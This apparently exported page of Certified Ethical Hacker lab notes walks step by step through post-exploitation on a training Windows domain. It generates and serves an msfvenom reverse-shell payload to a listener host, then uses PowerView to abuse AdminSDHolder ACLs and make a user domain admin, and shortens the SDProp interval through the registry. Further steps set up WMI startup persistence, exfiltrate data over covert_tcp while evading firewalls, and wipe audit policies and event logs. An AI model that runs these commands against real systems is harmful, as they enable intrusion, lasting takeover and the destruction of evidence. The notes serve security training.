class="toggle"><li><details open=""><summary>What is AdminSDHolder</summary><ul id="09188eb7-5c8f-4a8e-b10c-8722d32415aa" class="bulleted-list"><li style="list-style-type:disc">AdminSDHolder ensures that the permissions of accounts that belong to specific high-privilege groups are periodically reset to a known secure state.</li></ul><ul id="7b0e590b-493f-497f-a9e5-c5c7bc227276" class="bulleted-list"><li style="list-style-type:disc">Over time, the security descriptors (permissions) of sensitive accounts could be altered intentionally or unintentionally, potentially leading to unauthorized access or privilege escalation.</li></ul><ul id="0077dddb-5ff5-48d9-8117-918828d661ab" class="bulleted-list"><li style="list-style-type:disc">Every 60 minutes by default, the SDProp process runs and checks the security descriptors of all members of protected groups (such as <code>Domain Admins</code>, <code>Enterprise Admins</code>, <code>Administrators</code>, etc.).</li></ul><ul id="07b00abc-d04c-4c25-938d-1f33025fbd2d" class="bulleted-list"><li style="list-style-type:disc">If any discrepancies are found between the AdminSDHolder template and the security descriptors of these accounts, SDProp replaces the account&#x27;s security descriptor with the one from the AdminSDHolder object, ensuring consistent and secure permissions.</li></ul><ul id="a4459a1c-fad4-43f2-95c8-0b87342b72f8" class="bulleted-list"><li style="list-style-type:disc"><strong>If a user account is added into the access control list of AdminSDHolder, the user will acquire &quot;GenericAll&quot; permissions which is equivalent to domain administrators.</strong><br/><br/><br/></li></ul></details></li></ul><ul id="1184d022-911b-4e73-b43a-2d05156dde1f" class="toggle"><li><details open=""><summary>Gain a shell</summary><ul id="27eaa073-378b-4ee3-af17-3507c63a36f8" class="bulleted-list"><li style="list-style-type:disc"><code><strong>msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe &gt; /home/attacker/Desktop/Exploit.exe</strong></code></li></ul><ul id="b677d22e-f9f1-4a46-9271-51b265275ed5" class="bulleted-list"><li style="list-style-type:disc"><code>python -m http.server</code></li></ul><ul id="615d2964-3ebc-43d4-85ac-41b2af12c531" class="bulleted-list"><li style="list-style-type:disc"><code>msfconsole</code></li></ul><ul id="09bc8294-d2a8-4725-9070-ecb5c28daa16" class="bulleted-list"><li style="list-style-type:disc"><code>use multi/handler</code></li></ul><ul id="e26abfda-a7dd-474c-bed4-71455e33ed79" class="bulleted-list"><li style="list-style-type:disc"><code>set payload windows/meterpreter/reverse_tcp</code></li></ul><ul id="d43625e2-ac62-4986-8c8b-6dc842227dcf" class="bulleted-list"><li style="list-style-type:disc"><code>set lhost lport</code></li></ul><ul id="ff6fa29d-0e19-42c4-9443-f771605b6be5" class="bulleted-list"><li style="list-style-type:disc"><code>run</code></li></ul><ul id="80288181-65f3-4a6b-81bb-fff4050dc2b8" class="bulleted-list"><li style="list-style-type:disc">Run executable on target by accessing http page and downloading it</li></ul></details></li></ul><ul id="ed1173c7-2289-49c0-aef3-78f956767698" class="toggle"><li><details open=""><summary>Gain Admin Access on Domain</summary><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="7f5a6f30-0af7-46aa-82b0-7a381d03d369"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">As we have access to PowerShell access with <strong>admin privileges</strong>, we can add a standard user <strong>Martin</strong> in the CEH domain to the <strong>AdminSDHolder</strong> directory and from there to the <strong>Domain Admins</strong> group, to maintain persistence in the domain.<br/><br/><br/><strong>Note: This is possible because we already have penetrated a domain admin account which has write access to AdminSDHolder</strong></div></figure><p id="50b151a7-2d85-4179-9e5d-de8a8734ef45" class="">
</p><p id="981b4c87-4013-4028-99f7-3da05a0e4162" class="">
</p><ul id="bf6a50b1-9978-420f-a37b-e798f902bc48" class="bulleted-list"><li style="list-style-type:disc">Download <a href="https://github.com/PowerShellEmpire/PowerTools">https://github.com/PowerShellEmpire/PowerTools</a></li></ul><ul id="e5171c65-f63c-4ef5-a96c-6fee56f99548" class="bulleted-list"><li style="list-style-type:disc">Upload them to target in meterpreter <code><strong>upload -r /home/attacker/PowerTools-master C:\\Users\\Administrator\\Downloads</strong></code></li></ul><ul id="f2fe8e05-cead-471e-be08-8773ca94ab4e" class="bulleted-list"><li style="list-style-type:disc">Type <code>shell</code> in meterpreter</li></ul><ul id="08ca7b43-9351-461b-b239-d948f1f46f86" class="bulleted-list"><li style="list-style-type:disc"><code>powershell</code></li></ul><ul id="668edceb-bda8-4c7b-b0c9-1585ebde6849" class="bulleted-list"><li style="list-style-type:disc">Go to the PowerView folder we uploaded<ul id="b5e2f67b-2cdf-4556-beb8-f59ac11fc643" class="bulleted-list"><li style="list-style-type:circle"><code><strong>cd C:\Users\Administrator\Downloads\PowerView</strong></code></li></ul></li></ul><ul id="4e247de3-569f-49c2-9c8a-93b7d3a4e151" class="bulleted-list"><li style="list-style-type:disc"><code><strong>Import-Module ./powerview.psm1</strong></code></li></ul><ul id="a7e4f4c7-dec5-4611-819f-b56a86b6ca59" class="bulleted-list"><li style="list-style-type:disc">Add Martin to ACL of AdminSDHolder<ul id="e094bf12-3365-472f-bb6b-f0048b21503e" class="bulleted-list"><li style="list-style-type:circle"><code><strong>Add-ObjectAcl -TargetADSprefix &#x27;CN=AdminSDHolder,CN=System&#x27; -PrincipalSamAccountName Martin -Verbose -Rights All</strong></code></li></ul><ul id="02d196ff-f97c-47eb-b06c-09f44e056960" class="toggle"><li><details open=""><summary>Command Breakdown</summary><p id="86f05ff8-767d-493a-9d94-497f267fb365" class=""><br/>When a user has <br/><strong>NT AUTHORITY\SYSTEM</strong> rights set to <strong>Generic All</strong> on the <strong>AdminSDHolder</strong> object, it means that this user has full control over the <strong>AdminSDHolder</strong> object itself. This includes the ability to modify permissions, change ownership, or manipulate other settings related to the <strong>AdminSDHolder</strong>.<br/><br/><br/></p><ul id="93825d51-7f55-457d-8085-fc2dfb39f279" class="bulleted-list"><li style="list-style-type:disc"><code><strong>Add-ObjectAcl</strong></code>:<ul id="4fcb7ce6-f416-4879-addb-bd09a50e45ca" class="bulleted-list"><li style="list-style-type:circle">This is likely a custom or script-specific PowerShell function (not a native cmdlet) used to add an Access Control Entry (ACE) to the Access Control List (ACL) of an Active Directory object. This function would typically be part of a PowerShell module or script designed for managing AD permissions.</li></ul></li></ul><ul id="63cfb229-333c-46d6-a6ac-8c3b6d26b18c" class="bulleted-list"><li style="list-style-type:disc"><code><strong>TargetADSprefix &#x27;CN=AdminSDHolder,CN=System&#x27;</strong></code>:<ul id="4d04e313-afd8-4b41-bb0e-e0232baa3cc2" class="bulleted-list"><li style="list-style-type:circle">The <code>TargetADSprefix</code> parameter specifies the Distinguished Name (DN) of the target Active Directory object to which the ACL modification will be applied. In this case, the target is the <strong>AdminSDHolder</strong> object, which is located in the <code>CN=System</code> container within the domain.</li></ul></li></ul><ul id="ffce6b88-6788-47f5-9f47-757b6aa2a6c1" class="bulleted-list"><li style="list-style-type:disc"><code><strong>PrincipalSamAccountName Martin</strong></code>:<ul id="6b2853da-30b5-4add-b862-485f8b0c6984" class="bulleted-list"><li style="list-style-type:circle">The <code>PrincipalSamAccountName</code> parameter specifies the security principal (user or group) that will be granted permissions. Here, <code>Martin</code> is the SAM Account Name (Security Account Manager Account Name) of the user or group who will receive the specified permissions.</li></ul></li></ul><ul id="595efd30-71d0-47d1-bf9b-d9b483bd6740" class="bulleted-list"><li style="list-style-type:disc"><code><strong>Verbose</strong></code>:<ul id="6905687f-50f2-44b9-a7a8-d17ced1ff802" class="bulleted-list"><li style="list-style-type:circle">The <code>Verbose</code> switch is used to provide detailed output about what the command is doing as it runs. This is helpful for debugging or verifying that the command executed correctly.</li></ul></li></ul><ul id="d58408c4-bbee-403f-9bb5-0c8f9089382a" class="bulleted-list"><li style="list-style-type:disc"><code><strong>Rights All</strong></code>:<ul id="a648bec9-9477-4e7b-bb52-a9f2e1a3ed9e" class="bulleted-list"><li style="list-style-type:circle">The <code>Rights</code> parameter specifies the level of access rights that will be granted to the specified principal (<code>Martin</code>). In this case, <code>All</code> indicates that <code>Martin</code> is being granted all possible rights on the AdminSDHolder object. This would typically include rights such as read, write, delete, and modify permissions, among others.</li></ul></li></ul></details></li></ul></li></ul><ul id="d64bf38f-bfba-4443-88c5-6f17ef717193" class="bulleted-list"><li style="list-style-type:disc">Check Martin’s permissions<ul id="8bb5bbce-bea3-479d-8f80-149202db2094" class="bulleted-list"><li style="list-style-type:circle"><code><strong>Get-ObjectAcl -SamAccountName &quot;Martin” -ResolveGUIDs</strong></code></li></ul><ul id="47c9c950-6921-433a-bfef-f9d5c3a61ab0" class="bulleted-list"><li style="list-style-type:circle">It shows multiple identities, the most important is <code>NT AUTHORITY/SYSTEM</code> because it has access to the whole system</li></ul><ul id="60f92d4f-fea4-465a-bc72-81ed98926432" class="toggle"><li><details open=""><summary>What is NT AUTHORITY</summary><p id="f6db48fb-ba7f-4bbb-9da0-7edfb424aed2" class="">The <strong>NT AUTHORITY</strong> identity is a special account authority within the Windows operating system that is used to define various built-in security principals. These security principals (or accounts) are used by the operating system to perform specific system-level functions and control access to resources. These accounts are not typical user accounts; instead, they represent system-level identities and permissions that are crucial to the operation and security of the Windows environment.</p><ul id="4b6f99ff-d427-4ab9-b7eb-d402eefc250b" class="toggle"><li><details open=""><summary>Common NT AUTHORITY Accounts</summary><ul id="245577b6-7646-4979-b539-e8fd9a2d760b" class="bulleted-list"><li style="list-style-type:disc"><strong>SYSTEM (LocalSystem)</strong>:<ul id="7e42ebc4-4b19-415f-88b1-af9e2049f4a9" class="bulleted-list"><li style="list-style-type:circle"><strong>NT AUTHORITY\SYSTEM</strong>: This is one of the most powerful accounts in Windows. The SYSTEM account has full control over the entire system, including the ability to access all files, manage processes, and perform any operation on the system. It is used by the operating system and services that require unrestricted access to the system.</li></ul></li></ul><ul id="53659e05-2729-4e07-910e-488f80bc64ca" class="bulleted-list"><li style="list-style-type:disc"><strong>NETWORK SERVICE</strong>:<ul id="1dc0a754-aec0-41ba-9e3e-3a54d22d1b51" class="bulleted-list"><li style="list-style-type:circle"><strong>NT AUTHORITY\NETWORK SERVICE</strong>: This account has limited privileges on the local system but can present the computer&#x27;s credentials to remote servers. It is typically used by services that interact with network resources, allowing them to operate with lower privileges to minimize security risks.</li></ul></li></ul><ul id="87f92067-8ac7-47d8-851e-9669e79dde94" class="bulleted-list"><li style="list-style-type:disc"><strong>LOCAL SERVICE</strong>:<ul id="93da90f7-d26f-4ac8-9525-da13910f7635" class="bulleted-list"><li style="list-style-type:circle"><strong>NT AUTHORITY\LOCAL SERVICE</strong>: Similar to the NETWORK SERVICE account, the LOCAL SERVICE account has limited privileges on the local system. It is used by services that do not require elevated privileges and do not need to access network resources with specific credentials. It runs with very limited permissions, which helps reduce the attack surface.</li></ul></li></ul><ul id="0298a8b4-0845-4fac-a909-842c6ab19177" class="bulleted-list"><li style="list-style-type:disc"><strong>ANONYMOUS LOGON</strong>:<ul id="9126ecc4-d170-4bd2-93fd-2ee8c1da0bc6" class="bulleted-list"><li style="list-style-type:circle"><strong>NT AUTHORITY\ANONYMOUS LOGON</strong>: This identity represents users who are not authenticated, typically used when accessing resources anonymously, such as certain network shares that allow unauthenticated access.</li></ul></li></ul><ul id="b6c96fdf-71f3-4ba1-b5c4-410b8361c9e6" class="bulleted-list"><li style="list-style-type:disc"><strong>AUTHENTICATED USERS</strong>:<ul id="928b4173-2fd7-4bb1-9bab-d5f71ade405e" class="bulleted-list"><li style="list-style-type:circle"><strong>NT AUTHORITY\Authenticated Users</strong>: This identity includes any user who has successfully authenticated to the system. It&#x27;s commonly used in access control lists (ACLs) to grant permissions to all authenticated users.</li></ul></li></ul><ul id="65e96877-7c31-4740-bd3f-26b0ff0d21cd" class="bulleted-list"><li style="list-style-type:disc"><strong>INTERACTIVE</strong>:<ul id="b5b72810-05f9-4d6d-9160-d12f008e861e" class="bulleted-list"><li style="list-style-type:circle"><strong>NT AUTHORITY\INTERACTIVE</strong>: Represents users who are logged on interactively at the computer, as opposed to users connected over a network.</li></ul></li></ul><ul id="1e48271e-ead4-434b-8ba6-253d289a63a2" class="bulleted-list"><li style="list-style-type:disc"><strong>SERVICE</strong>:<ul id="cff94d5d-493e-45a2-946d-9d25d36e8922" class="bulleted-list"><li style="list-style-type:circle"><strong>NT AUTHORITY\SERVICE</strong>: Represents all services running on the system. It&#x27;s used in scenarios where services need to perform tasks without needing explicit user credentials.</li></ul></li></ul><ul id="456dc620-d035-4d35-ae74-1c983b6daa5e" class="bulleted-list"><li style="list-style-type:disc"><strong>REMOTE INTERACTIVE LOGON</strong>:<ul id="f3c6b800-6757-4813-9117-ab045eaa1c52" class="bulleted-list"><li style="list-style-type:circle"><strong>NT AUTHORITY\REMOTE INTERACTIVE LOGON</strong>: Represents users who are logged on through remote desktop connections.</li></ul></li></ul></details></li></ul><ul id="4f83502a-7e96-4f6c-bc73-14bc0cc6e35d" class="toggle"><li><details open=""><summary>Purpose and Importance</summary><ul id="a392b13f-8546-473b-aa77-879c939d1d83" class="bulleted-list"><li style="list-style-type:disc"><strong>System-Level Operations</strong>: They allow the Windows operating system to perform various tasks, such as running services, managing system processes, and handling network communications, without requiring a traditional user account.</li></ul><ul id="4d84aaa8-a3ca-4f13-8858-c00f40b93f72" class="bulleted-list"><li style="list-style-type:disc"><strong>Security Boundaries</strong>: These identities help enforce security boundaries. For example, running services under the LOCAL SERVICE or NETWORK SERVICE accounts rather than SYSTEM can help reduce the impact of a potential security breach by limiting the permissions of these accounts.</li></ul><ul id="a71208d6-19c4-49a0-9b4e-606e9c7365eb" class="bulleted-list"><li style="list-style-type:disc"><strong>Access Control</strong>: NT AUTHORITY identities are often used in Access Control Lists (ACLs) to specify which system components or users have certain permissions on files, services, or other resources.</li></ul></details></li></ul></details></li></ul><ul id="2623d88f-109b-42db-90fd-3e5b00a739d8" class="bulleted-list"><li style="list-style-type:circle">If we have <code>ActiveDirectoryRight</code>s set to <code>GenericAll</code> then we have success here</li></ul></li></ul><ul id="2e9f1a4e-c34c-48e6-afc4-161bc5d5ea30" class="bulleted-list"><li style="list-style-type:disc">Normally ACL will propagate in 60 minutes, to reduce this you can change the registry<ul id="0e92c0fe-99e9-43ea-9668-3be0ff6f4b8c" class="bulleted-list"><li style="list-style-type:circle"><code><strong>REG ADD HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /V AdminSDProtectFrequency /T REG_DWORD /F /D 300</strong></code></li></ul><ul id="81823457-1c08-49fc-9818-41a36bf8f93a" class="bulleted-list"><li style="list-style-type:circle">This changes it to three minutes</li></ul></li></ul><ul id="5948c8ea-94f5-4f07-8f7f-5962bfd58334" class="bulleted-list"><li style="list-style-type:disc">Check if martin has been added<ul id="bd04a21e-8b5e-4539-972c-27d6bae2be0a" class="bulleted-list"><li style="list-style-type:circle">Go to the Active Directory Server<ul id="95f03f63-d99e-408a-a348-bb8b2adfaab3" class="bulleted-list"><li style="list-style-type:square">Server Manager → Tools → Active Directory Users and Computers</li></ul></li></ul><ul id="a15d431e-14cd-472b-9f7d-d62b23293c98" class="bulleted-list"><li style="list-style-type:circle">On the window that opens up<ul id="2dcde96f-996e-455e-a022-b1dddb4ea217" class="bulleted-list"><li style="list-style-type:square">View → Check Advanced Features</li></ul><ul id="3a9c0208-ce99-426d-aeaf-c166f5aaa712" class="bulleted-list"><li style="list-style-type:square"><a href="http://CEH.com">CEH.com</a> → System → AdminSDHolder</li></ul><ul id="d0208df9-8cb0-4698-a2ee-3341ae5a68b7" class="bulleted-list"><li style="list-style-type:square">Right Click → Properties → Security tab</li></ul><ul id="4146f70d-6a87-4089-822d-d1a72b78ea1a" class="bulleted-list"><li style="list-style-type:square">Martin should have <code>Full Control</code> permissions</li></ul></li></ul></li></ul><ul id="92e5e85f-ec7f-4412-b770-54799aab7c30" class="bulleted-list"><li style="list-style-type:disc">Add Martin to domain admins<ul id="b37dbe7c-28f6-471f-9410-d5f744b82609" class="bulleted-list"><li style="list-style-type:circle">Go back to meterpreter shell</li></ul><ul id="589e3607-1ac0-4fc7-b10e-3cf7dab6017a" class="bulleted-list"><li style="list-style-type:circle"><code>net group &quot;Domain Admins&quot; Martin /add /domain</code></li></ul></li></ul><ul id="8e63ecd3-494e-49ca-9023-c3e567a7ace2" class="bulleted-list"><li style="list-style-type:disc">Verify Martin is a domain admin<ul id="7900acaa-7f3c-4046-95a4-d34f51b4637f" class="bulleted-list"><li style="list-style-type:circle">AD Server →  Server Manager → Tools Active Directory User and Computers</li></ul><ul id="b4bc8eb3-bf84-4af0-9e90-87f841169e93" class="bulleted-list"><li style="list-style-type:circle"><a href="http://CEH.com">CEH.com</a> → Users → Martin → Right Click → Properties</li></ul><ul id="1fe96769-26fa-4910-a3cd-b92f7763d939" class="bulleted-list"><li style="list-style-type:circle">Member Of tab→ Should say Domain Admins</li></ul><ul id="23707631-b44a-4e86-9814-2238e139816f" class="bulleted-list"><li style="list-style-type:circle">Now Martin has <code>Full Access</code> to the domain controller, be like martin</li></ul></li></ul><ul id="95aab7ea-dbb4-434f-8d14-0f38e3ea862a" class="bulleted-list"><li style="list-style-type:disc">Other PowerView commands to gain sensitive info<figure id="728323b9-197f-432e-8017-2c3669cc1f5a" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/image.png"><img style="width:377.20001220703125px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/image.png"/></a></figure><p id="b7882b86-258f-4556-ace7-fe12f85f325f" class="">
</p></li></ul></details></li></ul></details></li></ul><ul id="b5d53489-7806-490b-b017-ca168f73c2d4" class="toggle"><li><details open=""><summary>Privilege Escalation and Maintaining Persistence using WMI</summary><ul id="4364f09a-95ac-4b7c-b63c-aab39872634e" class="toggle"><li><details open=""><summary>What is WMI</summary><p id="57ff7b20-164f-4828-a65b-3fe55f50591a" class=""><strong>WMI (Windows Management Instrumentation)</strong> is a powerful and versatile system management tool built into Windows. It exists to provide a standardized way for administrators and applications to manage and automate tasks on Windows systems, both locally and remotely.<br/><br/><br/></p></details></li></ul><ul id="f7c3e4be-71c7-44ba-aaa5-8dc712428914" class="toggle"><li><details open=""><summary>Get a meterpreter shell on remote target</summary><ul id="addabf51-c182-4dd7-a06e-12f3c99c78f1" class="bulleted-list"><li style="list-style-type:disc"><code><strong>msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe &gt; /home/attacker/Desktop/wmi.exe</strong></code></li></ul><ul id="d68d2d5e-0a39-46c5-9766-a5fd316f97b1" class="bulleted-list"><li style="list-style-type:disc"><code>python -m http.server</code></li></ul><ul id="3581b910-e38c-46ed-8aaf-79f1704abb0c" class="bulleted-list"><li style="list-style-type:disc"><code>use multi/handler</code></li></ul></details></li></ul><ul id="76270416-dece-4f17-b7ea-e56ff2afe7d3" class="toggle"><li><details open=""><summary>Use WMI for privesc and persistence</summary><ul id="02324c6f-f69c-477d-a393-ac5d19ff73d4" class="bulleted-list"><li style="list-style-type:disc">Move Wmi-Persistence to target<ul id="27e0ba86-dfbd-4d5a-90ff-20c88e8ce96e" class="bulleted-list"><li style="list-style-type:circle">Download <a href="https://github.com/subesp0x10/Wmi-Persistence">https://github.com/subesp0x10/Wmi-Persistence</a></li></ul><ul id="3de6d55d-15d0-4f58-8cb8-7841df391ec1" class="bulleted-list"><li style="list-style-type:circle">Upload to target <code><strong>upload /home/attacker/Wmi-Persistence-master C:\\Users\\Administrator\\Downloads</strong></code></li></ul></li></ul><ul id="0f13ae5c-e7e1-47c8-a70b-0d6491b88143" class="bulleted-list"><li style="list-style-type:disc">Install persistence payload<ul id="4dd474ef-778d-40fe-ac36-1a323a2fbf7e" class="bulleted-list"><li style="list-style-type:circle"><code>load powershell</code></li></ul><ul id="d197471a-4798-4a9e-8895-dce8adebab56" class="bulleted-list"><li style="list-style-type:circle"><code>poershell_shell</code></li></ul><ul id="708a58ac-8e61-4c88-ba0d-d956ed222005" class="bulleted-list"><li style="list-style-type:circle"><code><strong>Import-Module ./WMI-Persistence.ps1</strong></code></li></ul><ul id="ca620e83-77fb-4b0a-9c3e-eb384ca22513" class="bulleted-list"><li style="list-style-type:circle"><code><strong>Install-Persistence -Trigger Startup -Payload “C:\Users\Administrator\Downloads\wmi.exe</strong></code></li></ul></li></ul><ul id="063def23-f21a-44d2-a0a2-1e3dc91d97a0" class="bulleted-list"><li style="list-style-type:disc">Verify persistence<ul id="36886c6e-8742-457f-878e-e3b48da33e1a" class="bulleted-list"><li style="list-style-type:circle"><code>start a multi/handler</code></li></ul><ul id="5a8eacc5-2d98-47c9-9812-1dd0fe97facf" class="bulleted-list"><li style="list-style-type:circle">Restart target machine</li></ul><ul id="fb8f12ec-40eb-4a8c-a386-c82559ec0ccb" class="bulleted-list"><li style="list-style-type:circle">Verify that you get a shell and use <code>getuid</code> to verify SYSTEM access</li></ul></li></ul></details></li></ul></details></li></ul><ul id="b8ecd922-60ae-4cce-aa2b-1937ed7cd86c" class="toggle"><li><details open=""><summary>Covert Channels using Covert_TCP</summary><p id="6acac585-a56b-4602-9f9f-b7aa84d4cef6" class="">Tunneling is used to bypass the access control rules of firewalls, IDS, IPS, and web proxies to allow certain traffic. </p><p id="cd9537f0-86a2-41d3-b97e-739857e6caae" class="">Covert channels can be created by inserting data into the unused fields of protocol headers. </p><p id="81dfdc7c-06ad-44bc-bd28-794e4c27ea56" class="">There are many unused or misused fields in TCP or IP over which data can be sent to bypass firewalls.</p><p id="8cd819ae-15a1-4f8b-ba43-9272c65392db" class="">
</p><ul id="9695cf3c-2b87-46f5-b9f1-f3832ac3615b" class="toggle"><li><details open=""><summary>What Covert_TCP does</summary><p id="be8953f9-c662-4624-bd45-6ddf05a89280" class="">The Covert_TCP program manipulates the TCP/IP header of the data packets to send a file one byte at a time from any host to a destination. It can act like a server as well as a client and can be used to hide the data transmitted inside an IP header. This is useful when bypassing firewalls and sending data with legitimate-looking packets that contain no data for sniffers to analyze.</p></details></li></ul><ul id="1e51f327-bd2f-46be-8c26-d3194dceb3bc" class="toggle"><li><details open=""><summary>Using Covert_TCP</summary><ul id="c77d65c0-991c-4747-b3b8-a7b10c523dba" class="bulleted-list"><li style="list-style-type:disc">Prepare covert_tcp in attacker machine<ul id="304b1195-b3d4-46a9-90d2-9a5a48c1dfdc" class="bulleted-list"><li style="list-style-type:circle">Create a <code>Send</code> folder on desktop and download the file there</li></ul><ul id="ea806ecb-5824-4455-a6e5-e83630aca72c" class="bulleted-list"><li style="list-style-type:circle">Copy<strong> </strong><code><strong>covert_tcp.c</strong></code><strong> </strong>from<strong> </strong><code><strong>CEHv12 Module 06 System Hacking\Covering Tracks Tools\Covert_TCP</strong></code> </li></ul><ul id="66035bc9-514e-49bb-8cb4-11b8d9cd6601" class="bulleted-list"><li style="list-style-type:circle">Compile it <code><strong>cc -o covert_tcp covert_tcp.c</strong></code></li></ul></li></ul><ul id="0127f1b1-5175-40e1-88f0-067dbe10631b" class="bulleted-list"><li style="list-style-type:disc">Go to victim machine<ul id="375e7cd0-9f15-4e2a-bbd7-f7ef1cf56bdb" class="bulleted-list"><li style="list-style-type:circle">Create a <code>Receive</code> folder</li></ul><ul id="727b5915-b4bb-474a-b214-2ea0f6af0eac" class="bulleted-list"><li style="list-style-type:circle">Paste the <code>covert_tcp.c</code> file from <code><strong>CEHv12 Module 06 System Hacking\Covering Tracks Tools\Covert_TCP</strong></code><strong>  </strong>in there</li></ul><ul id="35af5be2-20db-4451-b5d8-3e1d40225c0e" class="bulleted-list"><li style="list-style-type:circle">Compile it <code><strong>cc –o covert_tcp covert_tcp.c</strong></code></li></ul><ul id="0c99ccd3-5f69-484c-85ef-8e8cc3aca1fa" class="bulleted-list"><li style="list-style-type:circle">Type <code>sudo su</code> to gain superuser</li></ul><ul id="c17b3c4f-6ac8-4898-b643-7b4f4005286c" class="bulleted-list"><li style="list-style-type:circle">Type <code><strong>./covert_tcp -dest 10.10.1.9 -source 10.10.1.13 -source_port 9999 -dest_port 8888 -server -file /home/ubuntu/Desktop/Receive/receive.txt</strong></code></li></ul></li></ul><ul id="ea7655c4-471a-4665-9104-c5755103b427" class="bulleted-list"><li style="list-style-type:disc">Back to attacker machine<ul id="1bc21605-1e6b-4ff0-93d2-35033d9211e8" class="bulleted-list"><li style="list-style-type:circle">In the terminal go to <code>Send</code> folder</li></ul><ul id="17f9cbfd-7b8b-40ef-87f1-e610bd862f65" class="bulleted-list"><li style="list-style-type:circle">Type <code>sudo su</code> cuz it needs root</li></ul><ul id="7b08e18a-307f-4b5b-b8ae-6bb9e7efcc08" class="bulleted-list"><li style="list-style-type:circle">Type <code><strong>./covert_tcp -dest 10.10.1.9 -source 10.10.1.13 -source_port 8888 -dest_port 9999 -file /home/attacker/Desktop/Send/message.txt</strong></code></li></ul><ul id="a35fab5f-f3f8-4b2c-8ad8-9328f2ecd4d7" class="bulleted-list"><li style="list-style-type:circle">The message must be seen in the victim machine in the file <code>receive.txt</code></li></ul></li></ul><ul id="f603c1ba-2eb8-42d3-becc-4831574ef9ed" class="bulleted-list"><li style="list-style-type:disc">Observations<ul id="ea54d0c6-055b-4e31-9578-626e996b7987" class="bulleted-list"><li style="list-style-type:circle">If you capture with wireshark, and filter the ports used</li></ul><ul id="ea0f40ea-27ca-4c25-9dc6-5db23b017204" class="bulleted-list"><li style="list-style-type:circle">The packet data are observed to be sent one character at a time at one packet at a time</li></ul><ul id="525c3789-8f72-4118-8b8f-250acfc2e4e8" class="bulleted-list"><li style="list-style-type:circle">The character can be seen in the Identification field of IPv4 headers, in the ASCII field</li></ul></li></ul></details></li></ul><p id="6e5a5904-c408-4864-9770-4751226b21b4" class="">
</p><p id="5977960f-c55f-433e-848e-beb6762044ee" class="">
</p></details></li></ul></details></li></ul><ul id="90c1b63e-6834-4feb-80d7-0423cf0923d5" class="toggle"><li><details open=""><summary>Clear Logs and Hide Evidence of Compromise</summary><ul id="e31dbf1d-1f7b-4ac1-ae65-16986ee0d8ce" class="toggle"><li><details open=""><summary>View, Enable, and Clear Audit Policies using Auditpol</summary><ul id="303e1054-d25b-4830-935b-d03f34ec3754" class="bulleted-list"><li style="list-style-type:disc">Run <code>cmd</code> as admin</li></ul><ul id="39953f38-1049-4930-ade2-a32667b0c236" class="bulleted-list"><li style="list-style-type:disc">View Audit policies<ul id="cd6438f9-afa7-4b35-999b-07f5afefb82c" class="bulleted-list"><li style="list-style-type:circle">Type <code><strong>auditpol /get /category:*</strong></code></li></ul></li></ul><ul id="d45e95dd-85a7-4546-a766-6c3bee472ee9" class="bulleted-list"><li style="list-style-type:disc">Enable account logon auditing<ul id="1e1e8f64-f551-4cb6-a038-5d84bdb644a7" class="bulleted-list"><li style="list-style-type:circle"><code><strong>auditpol /set /category:&quot;system&quot;,&quot;account logon&quot; /success:enable /failure:enable</strong></code></li></ul></li></ul><ul id="a8c79090-faf5-4895-9335-4f63a4a5745f" class="bulleted-list"><li style="list-style-type:disc">Set everything to No Auditing<ul id="7440055c-9f16-4797-8358-51b4fd096a7d" class="bulleted-list"><li style="list-style-type:circle"><code><strong>auditpol /clear /y</strong></code></li></ul><ul id="fd96ccf0-65c7-4efd-bcd3-cdf991ca9d7c" class="bulleted-list"><li style="list-style-type:circle">But this produces audit event logs that say that system audit policy was changed</li></ul></li></ul></details></li></ul><ul id="24781149-21cd-4f5b-9f39-c4c8dc101e3d" class="toggle"><li><details open=""><summary>Clear Windows Machine Logs using Various Utilities</summary><ul id="45bb66b3-ee83-477f-bf4d-d99b488e824b" class="bulleted-list"><li style="list-style-type:disc">Use <code><strong>E:\CEH-Tools\CEHv12 Module 06 System Hacking\Covering Tracks Tools\Clear_Event_Viewer_Logs.bat</strong></code><ul id="74081071-f460-4960-9723-aa1575f0c9a6" class="bulleted-list"><li style="list-style-type:circle">Run it as <code>admin</code></li></ul></li></ul><ul id="c102d390-3fe0-42a5-b10d-0a1ba087222d" class="bulleted-list"><li style="list-style-type:disc">Use <code>wevtutil</code><ul id="22f458d6-1b1c-4900-a5c4-14b7bb7731d1" class="bulleted-list"><li style="list-style-type:circle">To show a list of event log names <code>wevtutil el</code></li></ul><ul id="1ee5601c-dbc2-465d-8b6d-6b4cbf3fbbee" class="bulleted-list"><li style="list-style-type:circle">To clear a log out of those <code>wevtutil cl &lt;logname&gt;</code><ul id="fcece828-f748-4114-8c99-d7bdf25f2094" class="bulleted-list"><li style="list-style-type:square">eg. <code>wevtutil cl system</code> clears system logs</li></ul><ul id="78fbb3a3-c643-482c-8302-b605fe834f16" class="bulleted-list"><li style="list-style-type:square">Can also be done for application, security etc.</li></ul></li></ul></li></ul><ul id="c9781c9f-3331-4efe-8422-9bb5261a6132" class="bulleted-list"><li style="list-style-type:disc">Overwrite deleted files in a drive or folder<ul id="5f2c241d-54ae-4356-9b93-a19e60b13d57" class="bulleted-list"><li style="list-style-type:circle"><code>cipher /w:&lt;directory&gt;</code> </li></ul><ul id="f7282bd6-737c-4563-a0c8-8a65939ff0d8" class="bulleted-list"><li style="list-style-type:circle">It starts overwriting the deleted files, first, with all zeroes (0x00); second, with all 255s (0xFF); and finally, with random numbers</li></ul><ul id="4a1dea1f-dd72-4385-ab33-c405b2450568" class="toggle"><li><details open=""><summary>Where its used<br/><br/></summary><p id="a595d82e-96d2-4eed-82d2-74d564c6c676" class="">When an attacker creates a malicious text file and encrypts it, at the time of the encryption process, a backup file is created. </p><p id="ce8beb7d-9d97-4b63-b3f9-cc32722d0126" class="">Therefore, in cases where the encryption process is interrupted, the backup file can be used to recover the data. After the completion of the encryption process, the backup file is deleted, but this deleted file can be recovered using data recovery software and can further be used by security personnel for investigation. </p><p id="38189551-af8a-409a-b361-19e6eef83be6" class="">To avoid data recovery and to cover their tracks, attackers use the Cipher.exe tool to overwrite the deleted files.<br/><br/></p></details></li></ul></li></ul></details></li></ul><ul 